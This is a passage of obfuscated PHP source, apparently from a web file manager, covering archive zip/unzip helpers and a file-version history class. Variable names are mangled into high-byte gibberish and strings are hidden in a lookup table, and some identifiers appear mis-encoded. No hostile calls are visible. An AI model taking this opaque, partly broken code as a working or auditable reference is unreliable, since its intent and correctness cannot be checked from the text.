(is_string($é»ÜÚÆ) && $é»ÜÚÆ) { $é»ÜÚÆ = array(array($Ú‹«””ë[87] => $é»ÜÚÆ)); } $¢£” ßÖ = self::init($é»ÜÚÆ[0][$Ú‹«””ë[87]]); $éè¦Ğ± = self::info($é»ÜÚÆ[0][$Ú‹«””ë[87]]); $É›éÇ‹Ã = $Ú‹«””ë[12]; $–œ³İº = $Ú‹«””ë[12]; $Í¤¿Ü®  = $Ú‹«””ë[12]; if ($°‡­µ„ && substr($°‡­µ„, -1, 1) != $Ú‹«””ë[8]) { $–œ³İº = get_path_father($°‡­µ„); $Í¤¿Ü®  = get_path_this($°‡­µ„); } else { $–œ³İº = self::pathFather($éè¦Ğ±[$Ú‹«””ë[87]]); $Í¤¿Ü®  = $éè¦Ğ±[$Ú‹«””ë[32]] . $Ú‹«””ë[10] . $•ß®êÙ„; if (count($é»ÜÚÆ) > 1) { $ú•ä‰é = IO::info($–œ³İº); $Í¤¿Ü®  = $ú•ä‰é[$Ú‹«””ë[32]] . $Ú‹«””ë[10] . $•ß®êÙ„; } if ($°‡­µ„) { $–œ³İº = $°‡­µ„; } } if ($¢£” ßÖ->getType() == $Ú‹«””ë[106]) { $ÓõÉ«Ú× = self::init($–œ³İº); $®¼ÏİÔˆ = $ÓõÉ«Ú×->getType() == $Ú‹«””ë[106] ? $–œ³İº : get_path_father($¢£” ßÖ->path); $®¼ÏİÔˆ = IO::getPathInner($®¼ÏİÔˆ); $®¼ÏİÔˆ = rtrim($®¼ÏİÔˆ, $Ú‹«””ë[8]) . $Ú‹«””ë[8]; mk_dir($®¼ÏİÔˆ); } else { $É›éÇ‹Ã = TEMP_FILES . $Ú‹«””ë[1372] . time() . rand_string(8) . $Ú‹«””ë[8]; mk_dir($É›éÇ‹Ã); file_put_contents($É›éÇ‹Ã . $Ú‹«””ë[1373], $Ú‹«””ë[12]); $®¼ÏİÔˆ = $É›éÇ‹Ã; } $ÒÒ¼æéõ = IO::info($®¼ÏİÔˆ); if (!$ÒÒ¼æéõ || !$ÒÒ¼æéõ[$Ú‹«””ë[233]]) { show_json(LNG($Ú‹«””ë[1374]), !1); } $Ö—”Ó˜ = self::zipFileList($é»ÜÚÆ, $É›éÇ‹Ã); foreach ($Ö—”Ó˜ as $ô¢‹ñ„¬ => $ğçè³“¶) { $Ö—”Ó˜[$ô¢‹ñ„¬] = self::iconvSystem($ğçè³“¶); } $Ó™ñæàî = get_filename_auto($®¼ÏİÔˆ . $Í¤¿Ü® , $Ú‹«””ë[12], $»á¶ÛŸæ); KodArchive::create(self::iconvSystem($Ó™ñæàî), $Ö—”Ó˜); if (!IO::exist($Ó™ñæàî)) { if ($É›éÇ‹Ã) { del_dir($É›éÇ‹Ã); } write_log($Ú‹«””ë[1375] . $Ó™ñæàî, $Ú‹«””ë[388]); show_json(LNG($Ú‹«””ë[1376]), !1); } if (!$É›éÇ‹Ã) { return $Ó™ñæàî; } $¯·¾ÒÚô = self::move($Ó™ñæàî, $–œ³İº, $»á¶ÛŸæ); if ($É›éÇ‹Ã) { del_dir($É›éÇ‹Ã); } if (!$Ó™ñæàî) { write_log($Ú‹«””ë[1377] . $Ó™ñæàî . $Ú‹«””ë[1378] . $–œ³İº, $Ú‹«””ë[388]); show_json(LNG($Ú‹«””ë[1376]), !1); } return $¯·¾ÒÚô; } public static function unzip($®æÌÁ¬, $¾ìëò¸ß, $ø©êºãç = "\x2d\x31", $ığÜ¥ÁÚ = "\162\x65\160\x6c\141\143\x65") { $îµúë…„ =& $_SERVER[©—Ò»ÅĞ]; $ßáæº¦‘ = parent::info($®æÌÁ¬); if (!$ßáæº¦‘) { show_json(LNG($îµúë…„[1379]), !1); } $Úúüóß© = IO::infoFullSimple($¾ìëò¸ß); if (!$Úúüóß©) { $¾ìëò¸ß = IO::mkdir($¾ìëò¸ß); } if (isset($Úúüóß©[$îµúë…„[191]]) && trim($Úúüóß©[$îµúë…„[87]], $îµúë…„[8]) != trim($¾ìëò¸ß, $îµúë…„[8])) { $“Ñ¹Ó¢Ê = KodIO::make($Úúüóß©[$îµúë…„[190]]); $°…‘¿¶’ = IO::fileNameAuto($“Ñ¹Ó¢Ê, $Úúüóß©[$îµúë…„[32]], REPEAT_RENAME_FOLDER, !0); $¾ìëò¸ß = IO::mkdir($“Ñ¹Ó¢Ê . $°…‘¿¶’); } $ø©êºãç = $ø©êºãç && $ø©êºãç != $îµúë…„[1380] ? @json_decode($ø©êºãç, !0) : -1; $²ƒÂı¸ = self::unzipPart($®æÌÁ¬, $ø©êºãç); if (!$²ƒÂı¸ || !IO::exist($²ƒÂı¸[$îµúë…„[230]])) { show_json(LNG($îµúë…„[105]), !1); } $–Úõá§ = $²ƒÂı¸[$îµúë…„[1381]][count($²ƒÂı¸[$îµúë…„[1381]]) - 1]; if ($–Úõá§[$îµúë…„[1309]] == -1 || substr($–Úõá§[$îµúë…„[32]], -1, 1) == $îµúë…„[8]) { $†ŸÌ–Óñ = $²ƒÂı¸[$îµúë…„[1382]] . rand_string(10) . $îµúë…„[8]; mk_dir($†ŸÌ–Óñ); $¾•ŒÖµ = count($²ƒÂı¸[$îµúë…„[1381]]) == 1 ? IO::ext($®æÌÁ¬) : get_path_ext($²ƒÂı¸[$îµúë…„[230]]); $ë¿­ºÑ‹ = KodArchive::extract(self::iconvSystem($²ƒÂı¸[$îµúë…„[230]]), $†ŸÌ–Óñ, $–Úõá§[$îµúë…„[1309]], $°…‘¿¶’, $¾•ŒÖµ); self::unzipErrorCheck($ë¿­ºÑ‹, array($îµúë…„[1383], $®æÌÁ¬, $¾•ŒÖµ, $¾ìëò¸ß, $²ƒÂı¸)); Hook::trigger($îµúë…„[1384], $†ŸÌ–Óñ); recursion_dir($†ŸÌ–Óñ, $Ì”ã ™¿, $’¸ì­ñò, 0); $„ÃªŞ = array_merge($Ì”ã ™¿, $’¸ì­ñò); $Îé‘¡ìµ = array(); foreach ($„ÃªŞ as $”©šÕàû) { $½úÖØä½ = IO::move(self::iconvApp($”©šÕàû), $¾ìëò¸ß, $ığÜ¥ÁÚ); if ($½úÖØä½) { $Îé‘¡ìµ[] = $½úÖØä½; } } del_dir($†ŸÌ–Óñ); } else { $½úÖØä½ = IO::move($²ƒÂı¸[$îµúë…„[230]], $¾ìëò¸ß, $ığÜ¥ÁÚ, get_path_this($–Úõá§[$îµúë…„[32]])); if ($½úÖØä½) { $Îé‘¡ìµ[] = $½úÖØä½; } } return $Îé‘¡ìµ ? $Îé‘¡ìµ : !1; } public static function unzipList($·Ò˜ñ£Ü) { $ı·´Û´ =& $_SERVER[©—Ò»ÅĞ]; $—éãÊß¬ = isset($·Ò˜ñ£Ü[$ı·´Û´[1385]]) ? $·Ò˜ñ£Ü[$ı·´Û´[1385]] : !1; $ÀÖĞ–¹£ = isset($·Ò˜ñ£Ü[$ı·´Û´[1309]]) ? @json_decode($·Ò˜ñ£Ü[$ı·´Û´[1309]], !0) : -1; $²œ§ºô = self::unzipPart($·Ò˜ñ£Ü[$ı·´Û´[87]], $ÀÖĞ–¹£); if (!$²œ§ºô || !IO::exist($²œ§ºô[$ı·´Û´[230]])) { show_json(LNG($ı·´Û´[105]), !1); } $¹í‰™ïâ = $²œ§ºô[$ı·´Û´[1381]][count($²œ§ºô[$ı·´Û´[1381]]) - 1]; $æ©Ë£™ù = in_array(IO::ext($²œ§ºô[$ı·´Û´[230]]), array($ı·´Û´[388], $ı·´Û´[1386], $ı·´Û´[1387], $ı·´Û´[1388], $ı·´Û´[1389], $ı·´Û´[1390])); if (!$—éãÊß¬ && ($¹í‰™ïâ[$ı·´Û´[1309]] == -1 || $æ©Ë£™ù)) { $’‡™äúš = $²œ§ºô[$ı·´Û´[1382]] . get_path_this($²œ§ºô[$ı·´Û´[230]]) . $ı·´Û´[960]; if (!IO::exist($’‡™äúš)) { $—³â‡Şƒ = $¹í‰™ïâ[$ı·´Û´[1309]] == -1 ? get_path_ext(IO::pathThis($·Ò˜ñ£Ü[$ı·´Û´[87]])) : get_path_ext($²œ§ºô[$ı·´Û´[230]]); $³„™»ÀÎ = KodArchive::listContent(self::iconvSystem($²œ§ºô[$ı·´Û´[230]]), !0, $—³â‡Şƒ); self::unzipErrorCheck($³„™»ÀÎ, array($ı·´Û´[1391], $·Ò˜ñ£Ü, $²œ§ºô)); @file_put_contents($’‡™äúš, json_encode($³„™»ÀÎ[$ı·´Û´[1392]])); } return @json_decode(IO::getContent($’‡™äúš), !0); } IO::fileOut($²œ§ºô[$ı·´Û´[230]], $—éãÊß¬, get_path_this($¹í‰™ïâ[$ı·´Û´[32]])); die; } private static function zipFileList($ñ»áÚ¶, $ó¡øˆÙï = false) { $¬®¾ŸÛõ =& $_SERVER[©—Ò»ÅĞ]; $ˆ¿¡¶ç = array(); foreach ($ñ»áÚ¶ as $Ôö¯¢ğå) { $ÍÕª¦û = $Ôö¯¢ğå[$¬®¾ŸÛõ[87]]; if ($ó¡øˆÙï) { $ÍÕª¦û = self::copy($Ôö¯¢ğå[$¬®¾ŸÛõ[87]], $ó¡øˆÙï, $¬®¾ŸÛõ[927]); } else { $Î«õµ›ö = self::init($Ôö¯¢ğå[$¬®¾ŸÛõ[87]]); if ($Î«õµ›ö->getType() == $¬®¾ŸÛõ[106]) { $ÍÕª¦û = $Î«õµ›ö->path; } } if ($ÍÕª¦û && self::local()->exist($ÍÕª¦û)) { $ˆ¿¡¶ç[$Ôö¯¢ğå[$¬®¾ŸÛõ[87]]] = $ÍÕª¦û; } } if (!empty($ˆ¿¡¶ç)) { return array_values($ˆ¿¡¶ç); } show_json(LNG($¬®¾ŸÛõ[1351]), !1); } private static function localFilePath($ÙØ€¿Ôº) { $¡¸œùÓ =& $_SERVER[©—Ò»ÅĞ]; $¼û®ıÁ  = KodIO::parse($ÙØ€¿Ôº); if ($¼û®ıÁ [$¡¸œùÓ[33]] == KodIO::KOD_SOURCE) { $‚‘¦ê = Model($¡¸œùÓ[933])->fileInfoGet(KodIO::sourceID($ÙØ€¿Ôº)); if (!$‚‘¦ê[$¡¸œùÓ[87]]) { show_json($¡¸œùÓ[1393], !1); } $ÙØ€¿Ôº = $‚‘¦ê[$¡¸œùÓ[87]]; } $«çÖàšá = self::init($ÙØ€¿Ôº); if ($«çÖàšá->pathParse[$¡¸œùÓ[1337]]) { $ÙØ€¿Ôº = $«çÖàšá->pathParse[$¡¸œùÓ[1337]]; $«çÖàšá = self::init($ÙØ€¿Ôº); } $º‹¾êÙ“ = $«çÖàšá->getType(); if ($º‹¾êÙ“ == $¡¸œùÓ[106] || $º‹¾êÙ“ == $¡¸œùÓ[1394]) { if (!$«çÖàšá->exist($«çÖàšá->path)) { show_json(LNG($¡¸œùÓ[105]), !1); } return $«çÖàšá->path; } return !1; } public static function unzipPart($È—ÕËõ‡, $§Ù¥˜“ = -1) { $ºš‡¢±£ =& $_SERVER[©—Ò»ÅĞ]; $íÜ”Ö¦„ = IO::pathThis($È—ÕËõ‡); if (!$§Ù¥˜“ || $§Ù¥˜“ == -1) { $ŠÒ±¶˜­ = array(array($ºš‡¢±£[32] => $íÜ”Ö¦„, $ºš‡¢±£[1309] => -1)); $ŠÒ±¶˜­[0][$ºš‡¢±£[1395]] = $ŠÒ±¶˜­[0][$ºš‡¢±£[32]]; } else { if (is_array($§Ù¥˜“)) { $ŠÒ±¶˜­ = $§Ù¥˜“; $¸ÙøÙ›¤ = count($ŠÒ±¶˜­) - 1; for ($ßÇÚ×Éú = 0; $ßÇÚ×Éú <= $¸ÙøÙ›¤; $ßÇÚ×Éú++) { $·ŒşÇÌ = $ŠÒ±¶˜­[$ßÇÚ×Éú]; $ÂÆ€öØ„ = get_path_this($·ŒşÇÌ[$ºš‡¢±£[32]]) . (checkExtSafe($·ŒşÇÌ[$ºš‡¢±£[32]]) ? $ºš‡¢±£[12] : $ºš‡¢±£[1396]); $ŠÒ±¶˜­[$ßÇÚ×Éú][$ºš‡¢±£[1395]] = $ºš‡¢±£[1397] . intval($·ŒşÇÌ[$ºš‡¢±£[1309]]) . $ºš‡¢±£[476] . $ÂÆ€öØ„; if ($ßÇÚ×Éú == 0) { continue; } $ŠÒ±¶˜­[$ßÇÚ×Éú][$ºš‡¢±£[1395]] = $ŠÒ±¶˜­[$ßÇÚ×Éú - 1][$ºš‡¢±£[1395]] . $ºš‡¢±£[1398] . $ŠÒ±¶˜­[$ßÇÚ×Éú][$ºš‡¢±£[1395]]; } } } if (!is_array($ŠÒ±¶˜­) || count($ŠÒ±¶˜­) == 0) { return !1; } $ç±±ê£ = $ŠÒ±¶˜­[count($ŠÒ±¶˜­) - 1]; if (!IO::exist($È—ÕËõ‡)) { return !1; } $­šæ§¹ = TEMP_FILES . $ºš‡¢±£[1399] . kodIO::hashPathSafe($È—ÕËõ‡) . $ºš‡¢±£[8]; $‹øÀíåõ = $­šæ§¹ . $ç±±ê£[$ºš‡¢±£[1395]]; mk_dir($­šæ§¹); file_put_contents(TEMP_FILES . $ºš‡¢±£[1373], $ºš‡¢±£[12]); if (IO::exist($‹øÀíåõ)) { return array($ºš‡¢±£[230] => $‹øÀíåõ, $ºš‡¢±£[1381] => $ŠÒ±¶˜­, $ºš‡¢±£[1382] => $­šæ§¹); } $Ú„©ùÚª = self::localFilePath($È—ÕËõ‡); if (!$Ú„©ùÚª) { $Ú„©ùÚª = $­šæ§¹ . $ºš‡¢±£[1400]; if (!IO::exist($Ú„©ùÚª)) { self::copy($È—ÕËõ‡, $­šæ§¹, !1, get_path_this($Ú„©ùÚª)); } } if (!$Ú„©ùÚª || !IO::exist($Ú„©ùÚª)) { return !1; } if ($ç±±ê£[$ºš‡¢±£[1309]] == -1) { return array($ºš‡¢±£[230] => $Ú„©ùÚª, $ºš‡¢±£[1381] => $ŠÒ±¶˜­, $ºš‡¢±£[1382] => $­šæ§¹); } $şçÎÒ© = $Ú„©ùÚª; foreach ($ŠÒ±¶˜­ as $ßÇÚ×Éú => $·ŒşÇÌ) { if (!$·ŒşÇÌ || $·ŒşÇÌ[$ºš‡¢±£[1309]] == $ºš‡¢±£[1380]) { break; } if (substr($·ŒşÇÌ[$ºš‡¢±£[32]], -1, 1) == $ºš‡¢±£[8]) { break; } $­¦˜ùÑâ = in_array(get_path_ext($·ŒşÇÌ[$ºš‡¢±£[1395]]), array($ºš‡¢±£[388], $ºš‡¢±£[1386], $ºš‡¢±£[1387], $ºš‡¢±£[1388], $ºš‡¢±£[1389], $ºš‡¢±£[1390])); $­‡×ü‚¡ = $ßÇÚ×Éú == count($ŠÒ±¶˜­) - 1 && $­¦˜ùÑâ; $‘‘ÚÇ– = $­šæ§¹ . $·ŒşÇÌ[$ºš‡¢±£[1395]]; $ÅÔç¢‚ = $­šæ§¹ . get_path_this($·ŒşÇÌ[$ºš‡¢±£[32]]); if (IO::exist($‘‘ÚÇ–)) { $şçÎÒ© = $‘‘ÚÇ–; continue; } $ó†ãô§  = $ßÇÚ×Éú == 0 ? get_path_ext($íÜ”Ö¦„) : get_path_ext($şçÎÒ©); $˜ïââ…ê = KodArchive::extract(self::iconvSystem($şçÎÒ©), $­šæ§¹, $·ŒşÇÌ[$ºš‡¢±£[1309]], $¾ü¢”“¢, $ó†ãô§ ); self::unzipErrorCheck($˜ïââ…ê, array($ºš‡¢±£[1401], $È—ÕËõ‡, $ŠÒ±¶˜­, $·ŒşÇÌ, $‘‘ÚÇ–)); if (IO::exist($ÅÔç¢‚)) { IO::rename($ÅÔç¢‚, get_path_this($‘‘ÚÇ–)); } $şçÎÒ© = $‘‘ÚÇ–; } $‹øÀíåõ = $şçÎÒ©; return array($ºš‡¢±£[230] => $şçÎÒ©, $ºš‡¢±£[1381] => $ŠÒ±¶˜­, $ºš‡¢±£[1382] => $­šæ§¹); } private static function unzipErrorCheck($Ìû…ì¨Ò, $ŠÑ·ÂÔ£ = false) { $«İ¦»¹í =& $_SERVER[©—Ò»ÅĞ]; if ($Ìû…ì¨Ò[$«İ¦»¹í[1402]]) { return !0; } write_log(array($«İ¦»¹í[1403], $Ìû…ì¨Ò, $ŠÑ·ÂÔ£), $«İ¦»¹í[1404]); $™ğ‹ï‰± = is_array($Ìû…ì¨Ò[$«İ¦»¹í[1392]]) ? json_encode($Ìû…ì¨Ò[$«İ¦»¹í[1392]]) : $Ìû…ì¨Ò[$«İ¦»¹í[1392]]; show_json($«İ¦»¹í[1405] . $™ğ‹ï‰±, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $êŠŒ§›À =& $_SERVER[©—Ò»ÅĞ]; $ÂßÉöø = $GLOBALS[$êŠŒ§›À[6]][$êŠŒ§›À[92]]; if ($ÂßÉöø[$êŠŒ§›À[1406]] != 1) { return; } if ($ÂßÉöø[$êŠŒ§›À[1407]] <= 0) { return; } if (isset($_REQUEST[$êŠŒ§›À[1408]]) && $_REQUEST[$êŠŒ§›À[1408]] == $êŠŒ§›À[91]) { return; } Hook::bind($êŠŒ§›À[1409], $êŠŒ§›À[1410]); Hook::bind($êŠŒ§›À[1411], $êŠŒ§›À[1412]); Hook::bind($êŠŒ§›À[1413], $êŠŒ§›À[1414]); Hook::bind($êŠŒ§›À[1415], $êŠŒ§›À[1416]); Hook::bind($êŠŒ§›À[1417], $êŠŒ§›À[1418]); Hook::bind($êŠŒ§›À[1419], $êŠŒ§›À[1420]); } public static function eventBeforeUpload($´ñ§æÀ) { if ($´ñ§æÀ[3] && $´ñ§æÀ[3] != REPEAT_REPLACE) { return; } $˜¶È¥ô´ = self::parsePath($´ñ§æÀ[0]); if (!$˜¶È¥ô´) { return; } self::add($˜¶È¥ô´); } public static function eventBeforeEdit($Ó´îí‹µ) { $Ş¢¸¹… = self::parsePath($Ó´îí‹µ[0]); if (!$Ş¢¸¹…) { return; } self::add($Ş¢¸¹…); } public static function eventBeforeCopyFile($çÜĞî¤¹, $‡·ş£“«, $¾×ŞÃÌØ, $óíÃµ˜, $¡ıöšµ›, $·ò•†­Å) { $«¯¨Ûòİ =& $_SERVER[©—Ò»ÅĞ]; if (isset($¾×ŞÃÌØ->_data[$«¯¨Ûòİ[1341]]) && $¾×ŞÃÌØ->_data[$«¯¨Ûòİ[1341]]) { return; } $Âş¾Ú‹ò = $¾×ŞÃÌØ->getPathOuter($óíÃµ˜); $½ÜÃ•³« = self::parsePath($Âş¾Ú‹ò); if (!$½ÜÃ•³«) { return; } self::add($½ÜÃ•³«); } public static function eventBeforeRename($Àïâ†™Ş) { $îòÈ¬¿š =& $_SERVER[©—Ò»ÅĞ]; $ë¼Èá¹‡ = self::parsePath($Àïâ†™Ş[0]); if (!$ë¼Èá¹‡) { return; } $˜¡¸ãñ­ = self::checkInHistory($ë¼Èá¹‡); if (!$˜¡¸ãñ­) { return; } if ($˜¡¸ãñ­[$îòÈ¬¿š[33]] == $îòÈ¬¿š[230]) { $Ğ§úö‘ = self::listData($ë¼Èá¹‡); if ($Ğ§úö‘ && $Ğ§úö‘[$îòÈ¬¿š[446]]) { self::moveHistory($ë¼Èá¹‡, $Àïâ†™Ş[1]); } } else { IO::rename($˜¡¸ãñ­[$îòÈ¬¿š[87]], $Àïâ†™Ş[1]); } } public static function eventBeforeMove($Ü ²³÷³) { $¸ö»ğ«ï =& $_SERVER[©—Ò»ÅĞ]; $Ÿ™Í¥ ¿ = self::parsePath($Ü ²³÷³[0]); if (!$Ÿ™Í¥ ¿) { return; } $¬çáÒÑ = self::parsePath($Ü ²³÷³[1]); if (!$¬çáÒÑ) { return; } $ñÓ€Åõû = $Ü ²³÷³[3]; $Œ—í×› = self::checkInHistory($Ÿ™Í¥ ¿); if (!$Œ—í×›) { return; } $ì›Š“€ = self::pathHistory($¬çáÒÑ); if ($Œ—í×›[$¸ö»ğ«ï[33]] == $¸ö»ğ«ï[230]) { $ˆâü°Ì = self::listData($Ÿ™Í¥ ¿); $²˜¼´é± = rtrim($¬çáÒÑ, $¸ö»ğ«ï[8]) . $¸ö»ğ«ï[8] . ($ñÓ€Åõû ? $ñÓ€Åõû : get_path_this($Ÿ™Í¥ ¿)); $„×ªøâ± = self::listData($²˜¼´é±); if ($ˆâü°Ì && $ˆâü°Ì[$¸ö»ğ«ï[446]] && $„×ªøâ± && $„×ªøâ±[$¸ö»ğ«ï[446]]) { return self::clear($Ÿ™Í¥ ¿); } if ($ˆâü°Ì && $ˆâü°Ì[$¸ö»ğ«ï[446]]) { self::moveHistory($Ÿ™Í¥ ¿, $ñÓ€Åõû, $ì›Š“€); } } else { IO::move($Œ—í×›[$¸ö»ğ«ï[87]], $ì›Š“€, !1, $ñÓ€Åõû); self::clearEmptyFolder(IO::pathFather($Œ—í×›[$¸ö»ğ«ï[87]])); } } public static function eventAfterRemove($·æÚÊÂ¶, $ÈÂ•Ğ¬Ô) { $³¶°÷›ù =& $_SERVER[©—Ò»ÅĞ]; if (!$ÈÂ•Ğ¬Ô) { return; } $©ŒêÙ¯© = self::parsePath($·æÚÊÂ¶[0]); if (!$©ŒêÙ¯©) { return; } $««´Û¥¾ = self::checkInHistory($©ŒêÙ¯©); if (!$««´Û¥¾) { return; } if ($««´Û¥¾[$³¶°÷›ù[33]] == $³¶°÷›ù[230]) { $–š–á”‰ = self::listData($©ŒêÙ¯©, !1); if ($–š–á”‰ && $–š–á”‰[$³¶°÷›ù[446]]) { self::clear($©ŒêÙ¯©, !1); } } else { IO::remove($««´Û¥¾[$³¶°÷›ù[87]]); self::clearEmptyFolder(IO::pathFather($««´Û¥¾[$³¶°÷›ù[87]])); } } private static function checkInHistory($ÙÀªşìü) { $ÜŠöµÅí = self::pathHistory($ÙÀªşìü); if (!IO::exist($ÜŠöµÅí)) { $ÜŠöµÅí .= $_SERVER[©—Ò»ÅĞ][1421]; } return IO::exist($ÜŠöµÅí) ? IO::info($ÜŠöµÅí) : !1; } private static function parsePath($ïŒûÜÊ) { $îæ­åı´ =& $_SERVER[©—Ò»ÅĞ]; if (!$ïŒûÜÊ) { return !1; } if (isset($GLOBALS[$îæ­åı´[1422]]) && $GLOBALS[$îæ­åı´[1422]]) { return; } $ş›·¢à· = KodIO::parse($ïŒûÜÊ); $ş´Ê»®Ó = $ş›·¢à·[$îæ­åı´[33]]; $ÆÃ–’ã = !$ş´Ê»®Ó || $ş´Ê»®Ó == KodIO::KOD_IO || $ş´Ê»®Ó == KodIO::KOD_SHARE_ITEM; if (!$ÆÃ–’ã || !$ş›·¢à·[$îæ­åı´[1423]]) { return !1; } if (substr($ïŒûÜÊ, 0, strlen(DATA_PATH . $îæ­åı´[1424])) == DATA_PATH . $îæ­åı´[1424]) { return !1; } if ($ş´Ê»®Ó == KodIO::KOD_SHARE_ITEM) { $Ë¶ä¿å = IO::init($ïŒûÜÊ); if ($Ë¶ä¿å->pathParse[$îæ­åı´[1337]]) { return self::parsePath($Ë¶ä¿å->pathParse[$îæ­åı´[1337]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $­âĞ¹ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $îæ­åı´[1425]); foreach ($­âĞ¹ as $Çõİ‚á¡) { if (!$ş´Ê»®Ó && substr($ïŒûÜÊ, 0, strlen($Çõİ‚á¡)) == $Çõİ‚á¡) { return !1; } } self::log($GLOBALS[$îæ­åı´[1331]] . $îæ­åı´[1426] . $ïŒûÜÊ); return $ïŒûÜÊ; } private static function pathHistory($êˆâòşí) { $Ë¶¾èï =& $_SERVER[©—Ò»ÅĞ]; $´¯¢ÉÌø = self::$_historyBase . ltrim(KodIO::clear($êˆâòşí), $Ë¶¾èï[8]); $´¯¢ÉÌø = str_replace(array($Ë¶¾èï[1427]), array($Ë¶¾èï[1428]), $´¯¢ÉÌø); return $´¯¢ÉÌø; } public static function log($Øœƒ‹×¼) { } public static function historyCount($Ü–¯ùµ±) { $àä…¥èæ =& $_SERVER[©—Ò»ÅĞ]; $Ğ‘™¸·â = array(); $ÈööëĞ¯ = array(); foreach ($Ü–¯ùµ± as $İ–Ûí•¹) { $ŠÏÈëúÙ = get_path_father($İ–Ûí•¹); if (!$ÈööëĞ¯[$ŠÏÈëúÙ]) { $ÈööëĞ¯[$ŠÏÈëúÙ] = array(); } $ÈööëĞ¯[$ŠÏÈëúÙ][] = get_path_this($İ–Ûí•¹); } foreach ($ÈööëĞ¯ as $ŠÏÈëúÙ => $Üá—±ú) { $ÍÊ‡±ª = self::parsePath($ŠÏÈëúÙ); if (!$ÍÊ‡±ª) { continue; } foreach ($Üá—±ú as $ÕßÂŸ¸Î) { $å–¨Ôğö = self::listData(rtrim($ÍÊ‡±ª, $àä…¥èæ[8]) . $àä…¥èæ[8] . $ÕßÂŸ¸Î, !1); if ($å–¨Ôğö && $å–¨Ôğö[$àä…¥èæ[446]]) { $Ğ‘™¸·â[rtrim($ŠÏÈëúÙ, $àä…¥èæ[8]) . $àä…¥èæ[8] . $ÕßÂŸ¸Î] = count($å–¨Ôğö[$àä…¥èæ[446]]); } } } return $Ğ‘™¸·â; } public static function add($îšàëæ¾) { $½ÅÁ…±ä =& $_SERVER[©—Ò»ÅĞ]; $ª«ÃÅì = self::listData($îšàëæ¾); if (!$ª«ÃÅì) { return; } $Ôéô¢µ„ = Model($½ÅÁ…±ä[873])->get($½ÅÁ…±ä[961]); $îİï¨Œ÷ = intval($GLOBALS[$½ÅÁ…±ä[6]][$½ÅÁ…±ä[92]][$½ÅÁ…±ä[1407]]); $Ô„öÁéà = $Ôéô¢µ„ == $½ÅÁ…±ä[962] ? min(5, $îİï¨Œ÷) : $îİï¨Œ÷; if ($îİï¨Œ÷ <= 0) { return; } $ë§ê©Õş = IO::info($îšàëæ¾); $½ç‹Äª = $ª«ÃÅì[$½ÅÁ…±ä[446]]; if ($ë§ê©Õş[$½ÅÁ…±ä[79]] == 0) { return; } if ($ë§ê©Õş[$½ÅÁ…±ä[79]] >= 1024 * 1024 * 500) { return !1; } $”ˆ‹Î·é = IO::hashSimple($îšàëæ¾); if ($½ç‹Äª && $½ç‹Äª[0][$½ÅÁ…±ä[694]] == $”ˆ‹Î·é) { return !0; } if (array_key_exists($½ÅÁ…±ä[233], $ë§ê©Õş) && !$ë§ê©Õş[$½ÅÁ…±ä[233]]) { return !1; } $„™¶û¦’ = short_id(time()); $ÄÎéï‚ = array($½ÅÁ…±ä[487] => $„™¶û¦’, $½ÅÁ…±ä[694] => $”ˆ‹Î·é, $½ÅÁ…±ä[32] => $ë§ê©Õş[$½ÅÁ…±ä[32]] . $½ÅÁ…±ä[10] . date($½ÅÁ…±ä[1429]) . rand_string(1), $½ÅÁ…±ä[79] => $ë§ê©Õş[$½ÅÁ…±ä[79]], $½ÅÁ…±ä[541] => USER_ID, $½ÅÁ…±ä[231] => time(), $½ÅÁ…±ä[1430] => $½ÅÁ…±ä[12]); IO::mkdir($ª«ÃÅì[$½ÅÁ…±ä[1431]]); $´“÷äĞ“ = IO::copy($îšàëæ¾, $ª«ÃÅì[$½ÅÁ…±ä[1431]], !1, $ÄÎéï‚[$½ÅÁ…±ä[32]]); if (!$´“÷äĞ“) { self::clearEmptyFolder($ª«ÃÅì[$½ÅÁ…±ä[1431]]); return !1; } array_unshift($½ç‹Äª, $ÄÎéï‚); if (count($½ç‹Äª) > $Ô„öÁéà) { $Ì‡Û©ç÷ = array_slice($½ç‹Äª, $Ô„öÁéà); foreach ($Ì‡Û©ç÷ as $£ŞÄ• ®) { IO::remove($ª«ÃÅì[$½ÅÁ…±ä[1431]] . $£ŞÄ• ®[$½ÅÁ…±ä[32]]); } $½ç‹Äª = array_slice($½ç‹Äª, 0, $Ô„öÁéà); } return self::saveData($ª«ÃÅì[$½ÅÁ…±ä[1432]], $½ç‹Äª); } public static function remove($¸ô•ºôĞ, $¾Ïùâ¢) { $ø– ßà =& $_SERVER[©—Ò»ÅĞ]; $§”¬ŒÑ = self::listData($¸ô•ºôĞ); $ç°´ğÀì = array(); if (!$§”¬ŒÑ) { return !1; } foreach ($§”¬ŒÑ[$ø– ßà[446]] as $Ş•í¬Ò) { if ($Ş•í¬Ò[$ø– ßà[487]] == $¾Ïùâ¢) { IO::remove($§”¬ŒÑ[$ø– ßà[1431]] . $Ş•í¬Ò[$ø– ßà[32]]); continue; } $ç°´ğÀì[] = $Ş•í¬Ò; } return self::saveData($§”¬ŒÑ[$ø– ßà[1432]], $ç°´ğÀì); } public static function clear($áï’éŸ›, $†Ä¤şÕˆ = true) { $™Û¼ëµë =& $_SERVER[©—Ò»ÅĞ]; $ÑÄïÜû» = self::listData($áï’éŸ›, $†Ä¤şÕˆ); if (!$ÑÄïÜû») { return !1; } foreach ($ÑÄïÜû»[$™Û¼ëµë[446]] as $Ä–­ŠîÎ) { IO::remove($ÑÄïÜû»[$™Û¼ëµë[1431]] . $Ä–­ŠîÎ[$™Û¼ëµë[32]]); } return self::saveData($ÑÄïÜû»[$™Û¼ëµë[1432]], array()); } public static function moveHistory($•ÒÍ‘ñä, $Ğ§§½æ½ = '', $şŞÌŸñã = '') { $–ãÛ•ú =& $_SERVER[©—Ò»ÅĞ]; $Âİä“ŞÉ = self::listData($•ÒÍ‘ñä, !1); if (!$Âİä“ŞÉ || !$Âİä“ŞÉ[$–ãÛ•ú[446]]) { return !1; } $ŸæÀôì³ = $–ãÛ•ú[1421]; $Ğ§§½æ½ = $Ğ§§½æ½ ? $Ğ§§½æ½ : get_path_this($•ÒÍ‘ñä); $şŞÌŸñã = $şŞÌŸñã ? $şŞÌŸñã : $Âİä“ŞÉ[$–ãÛ•ú[1431]]; $ÎùæÄĞÇ = substr(get_path_this($Âİä“ŞÉ[$–ãÛ•ú[1432]]), 0, -strlen($ŸæÀôì³)); foreach ($Âİä“ŞÉ[$–ãÛ•ú[446]] as $ãæçáºË => $´Øà®È) { $íÔ¶Ğè… = 